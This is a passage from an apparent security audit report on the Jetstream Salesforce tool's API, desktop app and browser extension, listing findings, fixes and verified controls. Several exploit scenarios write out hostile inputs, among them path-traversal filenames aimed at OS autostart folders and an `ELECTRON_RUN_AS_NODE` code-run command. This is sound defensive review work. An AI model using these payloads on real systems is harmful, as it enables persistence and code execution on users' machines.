- **Remediation:** For SAML, require an explicit verification signal or do **not** auto-join a brand-new subject to a pre-existing account purely by email (require a previously-linked subject, or gate first-time email linking behind an invitation). Make the OIDC `email_verified` check strict for the account-*linking* case (treat "absent" as "not verified"). Consider admin-approved linking whenever an incoming subject resolves to an existing account by email rather than by a linked subject.

### M-4 — No size/length caps on user-controlled records persisted to `user_sync_data` — ◐ PARTIALLY RESOLVED (2026-07-03)
- **Status:** Partial — safe caps added (`hashedKey.max(40)` matching the `char(40)` column, `orgId.max(255)`) plus the L-12 nesting-depth guard. **Held:** the per-record `data`/`key` byte cap — the query-history `key` embeds full SOQL (up to 100k chars), so the threshold needs a deliberate choice (see top section).
- **Location:** `libs/types/src/lib/sync/sync.types.ts:52,68-73`; `apps/api/src/app/db/data-sync.db.ts:283-307`; `prisma/schema.prisma` (`model UserSyncData`)
- **Category:** Input validation / stored-data integrity / resource-exhaustion DoS (CWE-770, CWE-400) — *the owner's explicitly-flagged priority area*
- **Description:** The data-sync push path is the primary place user-controlled data lands in Jetstream's own DB. Prototype-pollution is handled well (reserved-key rejection, recursive stripping, null-prototype maps) and record *count* is capped (`MAX_SYNC = 50`), but there is **no cap on the size of any individual field**: `data` is `z.record(z.string(), z.unknown())` with no byte cap → unbounded JSONB; `key` is a bare string → unbounded `key` column; `orgId` has no length/format validation. The only ceiling is the global 20 MB body limit and 100 req/min/IP rate limit.
- **Exploit scenario:** An authenticated user (recordSync entitlement) repeatedly POSTs `/api/data-sync/push` with 50 records each holding multi-MB blobs. At ~20 MB/request × 100 req/min this writes on the order of a gigabyte per minute per IP into `user_sync_data` with no per-user quota, degrading DB storage/IO and inflating the pull payload broadcast to the user's other clients.
- **Confidence:** Confirmed
- **Remediation:** Add explicit caps in the sync schema: a serialized-byte cap on `data` (reject records whose `JSON.stringify(data)` exceeds ~64–256 KB), `key: z.string().max(512)`, `orgId: z.string().max(64).nullish()`, `hashedKey: z.string().length(40)`. Consider a per-user row/byte quota.

### M-5 — `openFile` / `showFileInFolder` IPC pass an unvalidated path to `shell.openPath` — ⏸️ HELD (needs decision)
- **Status:** Held — restricting to the download dir could break legitimately opening files the user saved elsewhere; needs a review of all call sites. H-1 reduces the exposure meanwhile.
- **Location:** `apps/jetstream-desktop/src/services/ipc.service.ts:43-59`; exposed in `preload.ts:58-59`
- **Category:** Arbitrary file open / launch via IPC (CWE-73, CWE-749)
- **Description:** Both handlers take a renderer-supplied `filePath` and call `shell.openPath` / `shell.showItemInFolder` with no validation of location or extension. `shell.openPath` opens the target with its OS default handler — for an executable/`.app`/`.lnk`/script this executes it. Intended callers pass just-downloaded files, but nothing constrains the argument.
- **Exploit scenario:** A compromised renderer (via H-1/H-2) calls `window.electronAPI.openFile('/Users/x/Downloads/payload.app')` (or a path it caused to be written via M-6) and the OS launches it.
- **Confidence:** Confirmed / Likely
- **Remediation:** Restrict to files under the app's configured download directory / recent-documents list; resolve+normalize and verify containment; gate on an extension allow-list (mirror the `.csv`/`.xlsx` check already used in `protocol.service.ts:158-166`).

### M-6 — Path traversal in download filename → arbitrary file write outside the download directory — ✅ RESOLVED (2026-07-03)
- **Status:** Fixed — `basename()` applied to the supplied filename before joining the download dir across all three sinks (`file-download.service.ts` ×2, `protocol.service.ts` `will-download`).
- **Location:** `apps/jetstream-desktop/src/services/file-download.service.ts:36,128`; `protocol.service.ts:144`; default `omitPrompt:true` at `libs/desktop-types/src/lib/desktop-app.types.ts:171`
- **Category:** Path traversal / arbitrary file write (CWE-22, CWE-73)
- **Description:** When the user has set a download path (so `omitPrompt` is honored, default true), zip/bulk downloads write to `path.join(downloadPath, fileName)` with a renderer-supplied `fileName` never sanitized for `../`. A filename like `../../../../Library/LaunchAgents/evil.plist` (macOS) or `..\..\..\Start Menu\Programs\Startup\x.bat` (Windows) escapes the directory. A compromised renderer can also first call `setPreferences({fileDownload:{omitPrompt:true, downloadPath:…}})` to guarantee the no-prompt path, chaining to a persistence/RCE-grade write primitive.
- **Exploit scenario:** Compromised renderer calls `downloadBulkApiFile({ fileName: '../../../<autostart path>/payload', link: <valid job link> })`; the file lands in an OS auto-run location.
- **Confidence:** Confirmed / Likely
- **Remediation:** Sanitize to a basename (`path.basename(fileName)`), reject names containing separators/`..`, and assert the resolved path stays within `downloadPath` before creating the write stream. Apply the same to `item.getFilename()` in the `will-download` handler.

### M-7 — Desktop app-window CSP allows `script-src 'unsafe-inline'` — ⏸️ HELD (needs testing)
- **Status:** Held — removing `'unsafe-inline'` can break rendering if the built `index.html` emits an inline bootstrap script; needs a nonce/hash pass + a run of the packaged app.
- **Location:** `apps/jetstream-desktop/src/utils/utils.ts:27` (applied to all responses at `protocol.service.ts:90-100`)
- **Category:** Weak Content-Security-Policy (CWE-1021)
- **Description:** The CSP forced onto every response allows `script-src 'self' 'unsafe-inline' https://*.google.com`. `'unsafe-inline'` removes the primary CSP mitigation against injected inline scripts — significant here because the window exposes powerful IPC and because the same CSP is applied to any origin the window is navigated to (H-1), so it does nothing to contain a navigation hijack.
- **Exploit scenario:** An HTML-injection sink in the SPA yields an inline `<script>` that runs (permitted by `'unsafe-inline'`) and drives `window.electronAPI`.
- **Confidence:** Confirmed (weak directive) / Needs-verification (weaponization needs an injection sink)
- **Remediation:** Remove `'unsafe-inline'` from `script-src`; adopt nonces/hashes for any required inline scripts (the server-side desktop relay pages already use nonces). Add `object-src 'none'`.

---

## 6. Low-severity findings

### L-1 — User enumeration via distinct `AccountLocked` response
`libs/auth/server/src/lib/auth.db.service.ts:1122-1146,1173-1181`; `auth.errors.ts:157-165`. The login path carefully equalizes unknown-account vs wrong-password responses (dummy bcrypt, identical `InvalidCredentials`), but once an existing account crosses `MAX_FAILED_LOGIN_ATTEMPTS` it returns a distinct `AccountLocked` type/message (and returns before running bcrypt — a timing signal), whereas a non-existent email always returns `InvalidCredentials`. This is a registration oracle and also enables lockout-DoS of known accounts. **Fix:** return generic `InvalidCredentials` for locked accounts too (or gate lockout messaging behind a correct password); add IP/global login throttling independent of account state. *Confirmed.*

### L-2 — No step-up (re-authentication) for security-sensitive account changes
`apps/api/src/app/controllers/user.controller.ts` — `deletePassword` (:255), `toggleEnableDisableAuthFactor` (:392), `deleteAuthFactor` (:430), `unlinkIdentity` (:458), `saveOtpAuthFactor` (:362), `initPassword` (:227). Disabling/removing 2FA, removing the password, unlinking an identity, or adding an OTP factor require only a live session + CSRF token — no current password or existing 2FA code. A hijacked/borrowed session can silently weaken every recovery control (email confirmations are sent, and password ops do revoke other sessions). **Fix:** require a fresh factor (current password and/or current TOTP/email code) before mutating auth factors, removing a password, or unlinking the last strong identity. *Confirmed.*

### L-3 — CSRF double-submit skipped when the cookie is absent (migration path) + stale comment
`apps/api/src/app/routes/route.middleware.ts:592-611`. When an authenticated request arrives with no `doubleCSRFToken` cookie, the middleware mints one, sets `isNewTokenGenerated = true`, and `isValid = isNewTokenGenerated || validate(...)` — so the request proceeds without CSRF validation. Backstopped by `SameSite=Lax` on the `__Host-` session cookie (a cross-site POST carries neither cookie, so `checkAuth` 401s first), so no practical exploit today; the header comment also wrongly claims "logging-only" mode while the code returns 403. **Fix:** remove the migration bypass now that the window has elapsed; correct the comment. *Confirmed. (Reported by three reviewers.)*

### L-4 — Password hashing: bcryptjs cost 10, no pepper, silent 72-byte truncation
`libs/auth/server/src/lib/auth.utils.ts:151-169`. Pure-JS `bcryptjs` at cost 10, no application pepper; bcrypt ignores bytes past 72. Constant-time compare and the not-found dummy-hash timing equalizer are correctly implemented, so algorithm choice is the only weakness — a DB compromise exposes hashes to offline cracking with no second-secret barrier. **Fix:** raise cost to ≥12 (or migrate to argon2id/scrypt), add a KMS/env-sourced pepper (HMAC before bcrypt), pre-hash to avoid the 72-byte cliff, rehash-on-login. *Confirmed.*

### L-5 — Remember-device token (`deviceId`) written to logs — ✅ RESOLVED (2026-07-03)
`libs/auth/server/src/lib/auth.db.service.ts:318`. On a UA mismatch in `hasRememberDeviceRecord`, `logger.warn({ deviceId, userId }, …)` logs the 256-bit secret from the `remember-device` cookie that bypasses 2FA for that user. Anyone with log access gains a reusable 2FA-bypass token (still gated by primary auth + UA check). **Fix:** don't log `deviceId`; log a truncated hash or omit. (Verified reset tokens, verification codes, and CSRF tokens are *not* logged.) *Confirmed.*

### L-6 — No absolute session / long-lived external-token lifetime cap
`apps/api/src/main.ts:111-131` (rolling 48h, no absolute cap); `external-auth.service.ts:28` (`TOKEN_EXPIRATION` 90 days — note the desktop reviewer observed a 7-day issue TTL on the desktop path, so confirm the effective value per form factor). An active (or attacker-kept-alive) web session can persist indefinitely; `loginTime` is recorded but never enforced as a ceiling. **Fix:** enforce an absolute session lifetime from `loginTime`; shorten long-lived external tokens and lean on the existing rotation path. *Confirmed.*

### L-7 — Canvas OAuth callback has no real state/CSRF binding; PKCE `code_verifier` is client-visible
`libs/auth/salesforce-oauth/src/lib/salesforce-oauth.ts:257-282`; `apps/api/src/app/controllers/canvas.controller.ts:88-93`. The Canvas user-approval OAuth flow is stateless: PKCE verifier/nonce/loginUrl are packed into `state`, HMAC-signed, and returned to the browser; on callback the HMAC is verified but then the *same* state string is passed as `expectedState` to `validateAuthResponse` — a tautological check with no browser binding. The `code_verifier` also travels through the browser in base64 state (PKCE secrecy lost). **Impact is minimal:** the endpoint mints no Jetstream session, discards the token, and forging state requires the consumer secret. **Fix:** bind the flow to the browser (random state/verifier stored server-side or in an httpOnly cookie) or document it as intentionally stateless/identity-free; keep the PKCE verifier server-side. *Confirmed (impact Low).*

### L-8 — Canvas OAuth popup `message` handler does not validate `event.origin`
`apps/jetstream-canvas/src/app/core/Login.tsx:26-43`. The listener checks `event.source !== windowRef` but not `event.origin` before calling `Sfdc.canvas.client.repost(true)` on `oauth:success`. The source check largely forecloses exploitation (a cross-origin attacker can't obtain the window handle) and `repost` only re-submits an already-verified signed request. **Fix:** also assert `event.origin === window.location.origin`. *Confirmed (defense-in-depth).*

### L-9 — Inconsistent `recordSync` entitlement enforcement across form factors
Gate present at `apps/api/src/app/routes/api.routes.ts:92-93` (`verifyEntitlement('recordSync')`); absent on the extension/desktop equivalents (`web-extension-server.routes.ts:124-125`, desktop data-sync routes). A user entitled to the extension but not to record sync can still pull/push sync data through the extension/desktop routes. All sync data remains strictly `userId`-scoped, so this is a billing/feature-gating inconsistency, **not** cross-tenant exposure. **Fix:** apply an equivalent `recordSync` check inside the extension/desktop data-sync handlers (or shared middleware). *Likely.*

### L-10 — Legacy unauthenticated AES-256-CBC decrypt path with consumer-secret key reuse
`apps/api/src/app/services/salesforce-org-encryption.service.ts:140-153`; `libs/shared/node-utils/src/lib/shared-node-utils.ts:135-160`. Stored tokens not prefixed `v2:` are decrypted as AES-256-CBC **without authentication**, using `hexToBase64(ENV.SFDC_CONSUMER_SECRET)` as the key — reusing one secret across OAuth client auth and token encryption, with no integrity protection. New writes all use the authenticated v2/GCM path; this is a read-compat branch and no online padding-oracle is exposed (callers can't submit ciphertext; decrypt failures return a uniform sentinel). **Fix:** run the one-time re-encryption migration to convert v1→v2/GCM, then delete `decryptStringCbc` and the CBC branch. *Confirmed (documented debt).*

### L-11 — DB-layer credential writes trust the caller to pre-encrypt
`apps/api/src/app/db/salesforce-org.db.ts:218,264-266` (`accessToken` stored verbatim); `team.db.ts:1313` (`clientSecret`), `:1244` (`spPrivateKey`). These functions persist credential fields exactly as received, relying on the controller to have encrypted them. Current callers do so correctly, so this isn't active — but the DB layer offers no guardrail, so a future caller that forgets encryption would silently write a plaintext refresh token / SSO secret at rest. **Fix:** encapsulate encryption inside the DB/service function (accept plaintext, encrypt internally), or assert the ciphertext envelope prefix (`v2:`/`gcm!`) before persisting. *Likely (latent foot-gun).*

### L-12 — Unbounded-depth recursion over attacker-controlled JSON in `stripReservedKeys` — ✅ RESOLVED (2026-07-03)
`libs/types/src/lib/sync/sync.types.ts:22-46`. Recurses depth-first through user-supplied `data` with a `WeakSet` cycle guard but no depth limit; combined with the missing size cap (M-4), a deeply nested document within 20 MB can throw `RangeError: Maximum call stack size exceeded`. Impact limited to the requester's own operation (nuisance self-DoS). **Fix:** enforce a max nesting depth (~32–64) during validation. *Likely.*

### L-13 — Error handler returns internal exception `message` to clients for unhandled errors
`apps/api/src/app/utils/response.handlers.ts:391-395,312-317`; wrapping at `route.utils.ts:158-159`. For non-typed errors, `createRoute` wraps throws in `UserFacingError(ex)` which copies `ex.message` verbatim (only XML/Zod messages are scrubbed; Prisma errors are separately normalized). A raw `Error` from networking/filesystem/third-party libs (e.g. `connect ECONNREFUSED 10.x.x.x:5432`, internal paths) can reach the client JSON `message`. Stack traces are **not** sent, bounding impact; the code self-flags this (`// TODO: could be cases of leaking internal errors here`). **Fix:** in production, return a static message for the unknown-error branch and log the real detail server-side. *Confirmed. (Reported by two reviewers.)*

### L-14 — Chromium renderer sandbox disabled (`sandbox: false`)
`apps/jetstream-desktop/src/browser/config.ts:29`. Disables the OS-level renderer sandbox and runs the preload in a full Node context, raising the ceiling of any renderer/preload compromise and amplifying H-1/M-7. The preload only uses `contextBridge`/`ipcRenderer` (available to sandboxed preloads), so sandbox can most likely be enabled. **Fix:** set `sandbox: true` and verify the build; keep `contextIsolation: true`. *Confirmed.*

### L-15 — `runAsNode` Electron fuse left enabled
`electron-builder.config.js:96`. With `runAsNode` enabled, a local process can launch the signed/notarized binary with `ELECTRON_RUN_AS_NODE=1 <app> -e '<js>'` to run arbitrary Node under the app's code-signing identity/entitlements (on macOS, abusing TCC grants). Other fuses are set well (`onlyLoadAppFromAsar`, ASAR integrity, `enableNodeCliInspectArguments:false`, `enableNodeOptionsEnvironmentVariable:false`, `enableCookieEncryption:true`). **Fix:** set `runAsNode: false` unless a build/runtime step requires it. *Confirmed (needs prior local access).*

### L-16 — IPC handlers do not validate `event.senderFrame` / origin
`apps/jetstream-desktop/src/services/ipc.service.ts:39-90`. No handler verifies the invoking frame's origin is `app://jetstream`. Latent in today's single-trusted-window design, but this is the multiplier that turns H-1 into full IPC access. **Fix:** in `registerHandler`, reject calls whose `event.senderFrame` origin isn't the expected app origin. *Confirmed (latent).*

### L-17 — Server-driven `actionUrl` opened via `shell.openExternal` without scheme validation — ✅ RESOLVED (2026-07-03)
`apps/jetstream-desktop/src/services/notification.service.ts:41-45,63-65`; schema `desktop-app.types.ts:243-250` (`actionUrl: z.string().nullable()`). Notification `actionUrl` from the server is opened on click without constraint to `https:`. Trust boundary is the first-party HTTPS server, so low risk, but a compromised/misconfigured server could deliver a dangerous scheme. **Fix:** constrain `actionUrl` to `https:` at the schema and re-check before `openExternal`. *Confirmed (low likelihood).*

### L-18 — `web_accessible_resources` exposes every extension page to Salesforce origins (clickjacking)
`apps/jetstream-web-extension/src/manifest.json:79-90`. `resources: ["*.html","*.js","*.css","*.map","*.png","*.svg","/app/","/assets/"]` matched to `*.salesforce.com`, `*.force.com`, `*.visualforce.com`, etc. lets any page on those origins (including attacker-controllable Developer-Edition / VF / Site pages) frame `app.html` — the full admin app. No `frame-ancestors` on extension pages; only the content-script button checks `window.self !== window.top`. Cross-origin isolation prevents *reading* the frame, so impact is clickjacking of multi-step destructive actions + fingerprinting, and requires knowing the victim's SF host. **Fix:** narrow `resources` to the assets that genuinely must be page-reachable (content-script CSS/icons), remove `*.html`/`*.js`/`/app/`, tighten `matches`, consider `use_dynamic_url: true`, and add framing defenses to `app.html`. *Likely.*

### L-19 — Jetstream bearer JWT persisted in `chrome.storage.sync` (cloud-replicated)
`apps/jetstream-web-extension/src/extension-scripts/service-worker.ts:189,391,608`; `extension.store.ts:46-47,89`. The 7–90-day HS256 JWT and `deviceId` are written to `chrome.storage.sync`, which synchronizes through the browser vendor's account and mirrors to every device on the profile — widening a bearer token's exposure (a compromised Google/Firefox account or any synced device yields it). **Fix:** store bearer tokens in `chrome.storage.session` (in-memory) or `chrome.storage.local`; if cross-device convenience is needed, sync only a non-secret pairing id and have each device obtain its own device-bound token. *Confirmed.*

### L-20 — `contentAuthScript.js` validates origin but not `event.source` — ✅ RESOLVED (2026-07-03)
`apps/jetstream-web-extension/src/extension-scripts/content-auth-script.ts:15-18`. Checks `event.origin !== targetOrigin` but not `event.source === window`; the landing-page counterpart checks both. The strict full-origin comparison forecloses practical exploitation, so this is defense-in-depth. **Fix:** add `if (event.source !== window) return;`. *Confirmed.*

### L-21 — geo-ip-api Basic Auth uses non-constant-time credential comparison — ✅ RESOLVED (2026-07-03)
`apps/geo-ip-api/src/main.ts:42`. Compares Basic-Auth creds with `!==` and `||` short-circuit (non-constant-time; reveals whether the username alone matched), inconsistent with the main app's `timingSafeStringCompare`. No rate limiter in front of the geo-ip auth either. Service is intended to be private/server-to-server, so real-world exploitability is low. **Fix:** reuse `timingSafeStringCompare` (evaluate both fields, no short-circuit) and add a rate limiter ahead of the check. *Confirmed.*

### L-22 — geo-ip-api `POST /api/lookup` accepts an unbounded IP array under a 20 MB body — ✅ RESOLVED (2026-07-03)
`apps/geo-ip-api/src/main.ts:18,102-118`. `ips: z.string().array()` with no `.max()` under a 20 MB parser; a maximal body drives millions of synchronous MaxMind lookups in one request (CPU pin / stall on the single-process service). Requires the internal Basic-Auth credential. **Fix:** `z.string().array().max(1000)` and lower the body limit for this service (e.g. `256kb`). *Confirmed.*

### L-23 — `trust proxy = 1` may mis-attribute client IP behind Cloudflare
`apps/api/src/main.ts:138`; consumers `route.utils.ts:46`, `libs/auth/server/src/lib/auth.utils.ts:283`. The deployment is fronted by Cloudflare (logger + Sentry read `cf-connecting-ip` first) and Render's LB. This is **not** a spoofing bug — attacker-supplied `X-Forwarded-For` lands left of the header and is ignored, so rate-limit bypass is prevented. The concern is *accuracy*: if CF + Render are two appending hops, `req.ip` resolves to a shared CF egress IP, degrading IP-keyed rate limits / audit IPs / captcha `remoteip` to per-PoP granularity. There's also an internal inconsistency (logging prefers `cf-connecting-ip`; the limiter/audit/captcha path uses `req.ip`). **Fix:** confirm the production hop count; if CF is a separate hop, derive the security-relevant IP from a validated `CF-Connecting-IP` consistently across limiter, `getApiAddressFromReq`, and captcha. *Needs-verification.*

### L-24 — CSP `style-src` allows `'unsafe-inline'` and a blanket `https:`
`apps/api/src/app/utils/security-headers.ts:126-130`. `styleSrc`/`styleSrcElem` include `'unsafe-inline'` and `https:` (documented as required for Monaco Editor). Script execution is unaffected (`script-src` is nonce + `strict-dynamic`, no `unsafe-inline`), so no script XSS — residual risk is CSS-based injection/exfiltration. **Fix:** feed Monaco the per-request nonce where feasible and drop the blanket `https:` in favor of specific hosts. *Confirmed (bounded by strict script-src).*

---

## 7. Informational observations

- **SAML assertion signing is admin-configurable; response signing disabled** (`libs/auth/server/src/lib/saml.service.ts:130,133`). `wantAssertionsSigned` comes from per-team config; a team admin who sets it false (response signing already off) would cause unsigned assertions to be accepted — an admin foot-gun, not an unauth bypass. Consider forcing `wantAssertionsSigned: true` (or requiring signed response OR signed assertion) regardless of config.
- **`verifyEmailViaLink` is dead code** (`auth.controller.ts:188-197,1054-1140`) — defined but unmounted. If later mounted as a GET it would place the code in the URL and lacks the `/verify` attempt-budget logic. Delete if unused.
- **Residual timing oracle on password-reset request** (`auth.controller.ts:986-999`; `auth.db.service.ts:924-965`) — the dominant gap was already fixed (fire-and-forget send + constant response); an existing email still does `deleteMany`+`create` synchronously while a non-existent email throws after one read. Respond first, then generate/send asynchronously.
- **`escapeJsonForScript` does not escape backslashes** (`apps/api/src/app/utils/canvas.utils.ts:12-20`) — verified **not exploitable** (every `'` is rewritten to `'`; `JSON.stringify` emits only even-length backslash runs; `</script>` is blocked). Escape `\` and `&` anyway for robustness against future template changes.
- **AES-256-GCM SSO-secret encryption uses a 16-byte IV + SHA-256 KDF** (`sso-crypto.util.ts:3-48`) — acceptable (random per-message IV, authenticated, high-entropy key input; 16-byte length retained for backward-compatible decryption). If ever rotated, prefer a 12-byte nonce + HKDF label.
- **SSO discovery endpoint reveals whether a domain has SSO configured** (`sso-auth.service.ts:705-725`; `auth.controller.ts:1220-1255`) — by design (drives the login UI), CSRF-protected and rate-limited; allows domain enumeration.
- **`GET /api/salesforce-api/requests` returns the global API-catalog table unscoped** (`salesforce-api-requests.controller.ts:15-22`) — reviewed and **benign**: `SalesforceApi` is a global reference catalog with no per-user column.
- **Team DB mutators trust `teamId` from the controller** (`team.db.ts` — `getSsoConfiguration`, `updateSsoSettings`, `create*Configuration`, `updateLoginConfiguration`, etc.) — authorization is entirely controller-side (correct today via `checkTeamRole`/`verifyEntitlement`), but the `_UNSAFE` naming convention isn't applied, making the reliance easy to overlook. Document the precondition or funnel through a membership-checked helper.
- **PBKDF2 iteration floor is 10,000** (`salesforce-org-encryption.service.ts:37-41`) — acceptable given the high-entropy master-key input, but raising the floor is cheap defense-in-depth.
- **`hashedKey` length unvalidated in Zod** (`sync.types.ts:70`) while the column is `Char(40)` — an over-length value makes the raw INSERT throw and aborts the transaction (self-scoped 500). Add `z.string().length(40)`.
- **`findByIdsIncludingOtherModifiedRecords` can return an unpaginated result set** (`data-sync.db.ts:73-113`) when `updatedAt` is null — scoped to one user; consider a hard cap.
- **External-auth LRU cache serves a revoked/rotated token for up to 60s** (`external-auth.service.ts:20-21,240-264`) — documented, bounded tradeoff; rotation bypasses the cache. Optionally shorten TTL or use a shared cache for immediate cross-instance revocation.
- **`verifyToken` uses the unverified decoded payload for DB lookup/entitlement before signature verification** (`external-auth.service.ts:188-211`) — verified **safe** (lookup is by `hashToken(token)`; final `jwtVerifier` enforces signature/aud/iss/sub). Optionally verify signature first to fail fast.
- **`crossOriginOpenerPolicy: false` globally** (`main.ts:159`) — documented tradeoff to preserve `window.opener` for the Salesforce OAuth popup + Google Picker; CORP `same-origin` retained. Revisit if those flows become redirect-based.
- **Canvas sub-app CSP uses `script-src 'unsafe-inline'`** (`canvas.routes.ts:51`), unlike the nonce-based extension/desktop relay pages — scope limited to the Salesforce-framed, signed-request-gated `/canvas`. Prefer migrating to a nonce.
- **Large global body-parser limits (20 MB JSON / 30 MB raw)** app-wide (`main.ts:295-298`) — deliberate for a data tool; webhooks (100 KB) and CSP-report (100 KB) correctly scope tighter first. Consider per-route JSON limits.
- **API container declares no non-root `USER`** (`apps/api/Dockerfile`) — mitigated by Render sandboxing; adding a non-root user is standard defense-in-depth.
- **Extension SOQL string interpolation in user search** (`SfdcPageButtonUserSearch.tsx:43-52`) and **`window.open(..., '_blank')` without `noopener`** (`:164-192`) — self-scoped (user's own org/session) and out of the SOQL-escaping scope; noted as robustness items.

---

## 8. What looked solid (verified, not merely skimmed)

These controls were traced and confirmed working; they represent real defensive investment and should be preserved through any refactor.

**Authentication & sessions**
- Session **fixation** defense: `initSession` calls `req.session.regenerate()` before populating identity and rotates the CSRF token.
- **Cookies:** `__Host-`/`__Secure-` prefixes, `httpOnly`, `Secure` (derived, not env-overridable), `SameSite=Lax`, `Path=/`, no `Domain`; server-side Postgres store; `resave:false`, `saveUninitialized:false`.
- **Password-reset tokens:** 122-bit random, unique, 30-min expiry, single-use, per-row atomic attempt budget, constant-time compare, generic errors, and **all sessions revoked** on reset.
- **CSRF (both systems):** HMAC-keyed, session-bound, all comparisons constant-time; not forgeable without the server secret; login-CSRF blocked by SameSite + cookie/body binding.
- **TOTP:** 160-bit secret, encrypted at rest (AES-256-GCM), single-use via an **atomic** replay cache, grace window below a full step.
- **Login timing/enumeration:** precomputed dummy bcrypt on not-found; identical error type/message for not-found vs wrong-password (the lockout message is the sole leak — L-1).
- **Identity auto-linking:** requires both sides' emails verified, respects `allowIdentityLinking`, cross-user collisions throw; unlink is transactional and revokes the unlinked provider's sessions.

**Federated identity**
- **OIDC:** PKCE S256, random `state` compared against an httpOnly cookie (real CSRF binding), `nonce` enforced, ID-token signature/issuer/audience/expiry validated by `oauth4webapi` against the discovered JWKS (no `alg:none`/HS-confusion), userinfo bound to the ID-token `sub`, missing cookies fail closed, `redirect_uri` server-fixed per team.
- **SAML:** signature verified against the configured IdP cert with `getVerifiedXml` (XSW-resistant), multiple-assertion responses rejected, audience checked against a **server-derived** per-team SP entityId, timestamp + `InResponseTo` + a **mandatory cluster-wide replay cache** that fails closed, XXE blocked by a DOCTYPE/ENTITY guard.
- **Salesforce Canvas signed request:** HMAC-SHA256, algorithm pinned (rejects non-`HMACSHA256`), constant-time compare, verified before any trust; no Jetstream session minted from Canvas.
- **SSRF defense:** single DNS resolution validated against a comprehensive private/reserved/cloud-metadata deny-list, then the connection **pinned to the validated IP** (defeats DNS-rebinding), with per-hop re-validation on redirects — applied consistently to OIDC discovery/token/userinfo/JWKS and SAML metadata.
- **Open-redirect handling:** rejects control chars/whitespace/backslashes, blocks protocol-relative `//`, re-emits only path/query/hash, origin-allow-lists absolute URLs; applied to all post-login redirects, SAML RelayState, and `redirect.routes.ts`.

**API authorization & multi-tenancy**
- **Org-connection authorization** (the critical control): resolved via `findByUniqueId_UNSAFE(user.id, uniqueId)` backed by a DB compound-unique key + a redundant owner re-check; no user-supplied host reaches a credentialed request.
- **Team authorization** is layered: server-side membership+role middleware, controller-side assignable-role gating (BILLING can't grant ADMIN), a last-active-admin invariant under Serializable isolation, compare-and-set on invitation role changes, and DB sub-resources scoped by compound key.
- **Billing role checks** read fresh from the DB rather than trusting a stale session.
- **WebSocket** authenticates via session (browser) or JWT (extension/desktop) with an Origin allowlist, and emits only to per-`userId` rooms; no client→server action handlers.
- **Scanner/test bypass routes** are triple-gated (env flag + non-prod + Basic auth) or `hostname === 'localhost'`; 404 in production.

**Database & crypto**
- **All four raw-SQL spots use true Prisma parameter binding — no injection** (health check literal; the data-sync bulk insert via `Prisma.sql`/`Prisma.join`; `pg_advisory_xact_lock(${orgId})` where `orgId` is an integer PK; the `jsonb_set` session update with `::jsonb`/`::uuid` bound params). No `$queryRawUnsafe`/`$executeRawUnsafe`/`Prisma.raw` anywhere in `apps`/`libs`.
- **No Prisma filter / mass-assignment injection:** no raw request objects spread into `where`/`data`/`orderBy`/`select`/`include`; writes are allow-listed by explicit mapping or a Zod `.parse()` immediately before the spread.
- **Credential encryption for new writes** is correct: AES-256-GCM, fresh random 12-byte IV per encryption, 32-byte key, auth tag verified on decrypt, per-user + per-record PBKDF2-derived key with a fresh salt, dedicated `SFDC_ENCRYPTION_KEY`. Extension/desktop tokens encrypted with a separate lookup hash; SSO secrets encrypted and masked from API responses.
- **Prototype-pollution defense** in the data-sync path is thorough (schema rejection + recursive stripping + null-prototype maps).
- **Consistent tenant scoping** across all DB modules (keyed by `userId`, or compound `teamId_userId` / `{id, teamId}`).

**Platform / transport**
- **Both webhooks verify signatures:** Stripe `constructEvent` on the raw body (mounted before global parsers); Mailgun HMAC-SHA256 over `timestamp+token` with a ±15-min window, TOCTOU-free cross-worker replay prevention, constant-time compare, fail-closed when the key is unset.
- **CORS** is not reflectively credentialed in production; the only Origin reflection (`/web-extension/*`, socket.io) is exact-match on extension ID and sets no `Allow-Credentials`; `origin:true, credentials:true` is dev+localhost only; the `/analytics` proxy strips session/CSRF/Authorization before forwarding.
- **`trust proxy = 1`** (not `true`) prevents `X-Forwarded-For` spoofing of `req.ip`.
- **Security headers:** nonce + `strict-dynamic` CSP on `/app`, HSTS (preload gated to the real hostname), locked `Permissions-Policy`, `frame-ancestors 'self'` + `X-Frame-Options`, `nosniff`, CORP.
- **CSP report endpoint** is unauth but hardened (rate-limited, 100 KB parser, field truncation, max 10/request, URLs reduced to origin+path).
- **Logging redaction:** pino redacts cookie/authorization/token/password (+ wildcards), URL params (`code`/`state`/`token`/…), hashes session ids; Sentry `sendDefaultPii:false` with deep `beforeSend` redaction.
- **No committed production secrets:** `.env.production` holds only public config; `.env.example` is placeholders; a startup guard rejects placeholder/weak secrets in production.

**Desktop / extension (the good parts)**
- Desktop `webPreferences`: `nodeIntegration:false`, `contextIsolation:true`, `nodeIntegrationInWorker/InSubFrames:false`, `webSecurity`/`allowRunningInsecureContent`/`experimentalFeatures`/`webviewTag` at safe defaults; **production loads local bundled content**, not the remote web app.
- Desktop **request proxy** pins caller URLs to the org's own HTTPS origin and strips `authorization`/`cookie`/`host`; org tokens are never handed to the renderer; **deep-link** flows are nonce/PKCE-gated with a 15-min timeout; **auto-update** is HTTPS-only with code-signature/`publisherName` verification, hardened fuses, and ASAR integrity.
- Extension ships **Manifest V3** with **minimal permissions** (`storage`, `cookies` — no `<all_urls>`/`webRequest`/`scripting`/`nativeMessaging`), the **secure default CSP** (no `unsafe-eval`, no remote scripts), **no remote code at runtime**, no `innerHTML`/`eval` sinks, the token **never exposed to page context**, and **strong server-side device-bound token binding** with encrypted-at-rest storage and logout revocation.

---

## 9. Prioritized remediation roadmap

> **Update (2026-07-03):** Items H-1, H-2, H-4, M-2, M-6, and the safe quick wins (L-5, L-12, L-17, L-20, L-21, L-22, plus M-4's safe caps) are **done** — see the remediation update at the top. The remaining items below are the open/held work; the "Now" bucket is now effectively **H-3 + M-5** (the two desktop items that needed a decision or wider validation).

**Now (High — close the desktop/extension escalation paths):**
1. **H-1** Add `will-navigate`/`will-redirect` origin guards to the desktop window.
2. **H-2** Scheme allow-list (`https:` only) before every `shell.openExternal` (and L-17).
3. **H-4** Remove the extension `onMessageExternal` handlers (or add `externally_connectable` + `sender` validation).
4. **H-3** Encrypt `app-data.json` at rest (OS keychain/`safeStorage`), or formally accept the risk with compensating controls.
5. **M-5 / M-6** Validate/normalize IPC file paths and download filenames (basename + containment check). These pair with H-1/H-2 to complete the renderer-compromise chain.

**Next (Medium — server-side backstops):**
6. **M-2** One-line owner scope on `revokeExternalSession` (`deleteMany({ id, userId })`).
7. **M-1** Per-user 2FA-failure lockout/backoff.
8. **M-4 / L-12** Size and depth caps on data-sync payloads (the owner's flagged priority).
9. **M-3** Tighten SSO email-based account joining (strict `email_verified`; no first-time SAML auto-join by email alone).
